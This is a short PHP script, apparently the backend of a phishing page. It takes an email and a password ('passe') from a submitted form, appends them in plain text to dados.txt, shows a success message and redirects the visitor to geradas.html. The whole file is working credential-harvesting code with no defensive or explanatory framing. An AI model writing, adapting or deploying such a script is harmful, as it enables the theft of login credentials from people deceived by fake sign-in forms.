<?php
$emaill = $_POST['emaill'];
$namep = $_POST['namep'];

$dados = "Email: " . $emaill . "\npasse: " . $namep . "\n\n";

$file = fopen("dados.txt", "a"); // 'a' abre o arquivo para escrita, adicionando os dados no final
fwrite($file, $dados);
fclose($file);

echo "Dados salvos com sucesso!";
header("location:geradas.html")


?>
